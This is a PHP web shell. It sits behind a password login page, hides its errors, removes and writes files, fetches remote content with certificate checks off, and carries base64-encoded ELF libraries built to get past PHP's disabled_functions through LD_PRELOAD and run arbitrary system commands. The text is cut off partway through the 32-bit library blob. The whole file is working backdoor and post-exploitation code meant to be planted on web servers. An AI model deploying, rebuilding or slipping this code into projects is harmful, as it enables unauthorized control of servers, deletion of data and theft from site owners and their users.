<?php
error_reporting(0); @set_time_limit(0); @ini_set('display_errors', '0'); $ph = '$2a$12$orz71J2t69PrsQuV5t0d/e0OYhU7GaxIcCnthOts/rV6RzR5wvwde'; $sk = 'SFEC_V7'; $cn = md5($_SERVER['HTTP_HOST'] . $sk); $rd = isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : ''; if (!is_string($rd) || $rd === '') $rd = $_SERVER['SCRIPT_NAME']; else $rd = preg_replace('#/+#', '/', $rd); if (isset($_GET['out'])) { @setcookie($cn, '', time() - 3600, '/'); @header('Location: ' . $rd); exit; } $auth = false; if (isset($_COOKIE[$cn]) && $_COOKIE[$cn] === md5($ph . $sk)) $auth = true; if (!$auth && isset($_POST['k']) && crypt($_POST['k'], $ph) === $ph) { @setcookie($cn, md5($ph . $sk), time() + 86400, '/'); @header('Location: ' . $rd); exit; } if (!$auth) { die('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Auth</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#ccc;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh}
.x{background:#111;border:1px solid #222;padding:40px;border-radius:4px;width:320px;text-align:center}
.x h2{color:#2ecc71;margin-bottom:25px;font-size:18px;letter-spacing:2px}
.x input{background:#000;border:1px solid #333;color:#0f0;padding:12px;width:100%;margin-bottom:15px;text-align:center;font-family:monospace}
.x input:focus{outline:none;border-color:#2ecc71}
.x button{background:#2ecc71;color:#000;border:none;padding:12px 30px;cursor:pointer;width:100%;font-weight:bold;letter-spacing:1px}
@media (max-width:480px){*{-webkit-tap-highlight-color:transparent}.x{width:92%;max-width:320px;padding:28px 18px}.x h2{font-size:16px;letter-spacing:1px}.x input{padding:13px;font-size:15px}.x button{padding:13px;font-size:14px}}
</style></head><body><div class="x"><h2>ACCESS</h2><form method="post"><input type="password" name="k" placeholder="Password" autofocus><button type="submit">LOGIN</button></form></div></body></html>'); } function _xor($data, $key) { $out = ''; $kl = strlen($key); for ($i = 0; $i < strlen($data); $i++) $out .= chr(ord($data[$i]) ^ ord($key[$i % $kl])); return $out; } function fmtSize($b) { $u = ['B','KB','MB','GB','TB']; $i = 0; while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; } return sprintf('%.1f %s', $b, $u[$i]); } function _rm($path) { if (!file_exists($path)) return; if (!is_dir($path)) { if (DIRECTORY_SEPARATOR === '\\') @chmod($path, 0666); @unlink($path); return; } $items = @scandir($path); if (!$items) { if (DIRECTORY_SEPARATOR === '\\') @chmod($path, 0777); @rmdir($path); return; } foreach ($items as $it) { if ($it === '.' || $it === '..') continue; $fp = $path . DIRECTORY_SEPARATOR . $it; _rm($fp); } if (DIRECTORY_SEPARATOR === '\\') @chmod($path, 0777); @rmdir($path); } function _sv($path, $data) { $fp = @fopen($path, 'wb'); if (!$fp && DIRECTORY_SEPARATOR === '\\') { @chmod($path, 0666); $fp = @fopen($path, 'wb'); } if ($fp) { @flock($fp, LOCK_EX); @ftruncate($fp, 0); @fwrite($fp, $data); @flock($fp, LOCK_UN); @fclose($fp); return true; } return @file_put_contents($path, $data, LOCK_EX) !== false; } function hx($s) { global $sk; return bin2hex(_xor($s, $sk)); } function _bytes($v) { $v = trim((string)$v); if ($v === '') return 8388608; $n = (int)$v; $u = strtoupper(substr($v, -1)); if ($u === 'G') return $n * 1073741824; if ($u === 'M') return $n * 1048576; if ($u === 'K') return $n * 1024; return $n; } $disabled = @ini_get('disable_functions'); $disabledList = $disabled ? explode(',', $disabled) : []; $disabledList = array_map('trim', $disabledList); $disabledList = array_filter($disabledList); function _isDisabled($fn) { global $disabledList; return in_array($fn, $disabledList); } function _fnAvailable($fn) { return function_exists($fn) && !_isDisabled($fn); } function _archName() { $m = strtolower(php_uname('m')); if (in_array($m, ['x86_64','amd64'])) return 'x64'; if (in_array($m, ['i386','i486','i586','i686','x86'])) return 'x86'; if (PHP_INT_SIZE === 8) return 'x64'; if (PHP_INT_SIZE === 4) return 'x86'; return null; } function _httpGet($url) { if (function_exists('curl_init')) { $ch = @curl_init($url); if ($ch) { @curl_setopt_array($ch, [ CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_CONNECTTIMEOUT => 15, CURLOPT_TIMEOUT => 30, CURLOPT_USERAGENT => 'Mozilla/5.0 (X11; Linux x86_64)', ]); $data = @curl_exec($ch); $err = @curl_error($ch); @curl_close($ch); if (is_string($data) && $data !== '' && $err === '') return $data; } } if (ini_get('allow_url_fopen')) { $ctx = @stream_context_create([ 'http' => ['timeout' => 30, 'follow_location' => 1, 'user_agent' => 'Mozilla/5.0', 'ignore_errors' => true], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false], ]); $data = @file_get_contents($url, false, $ctx); if (is_string($data) && $data !== '') return $data; } return false; } function _soB64($arch) { $b = array('x64' => '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AAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==', 'x86' => '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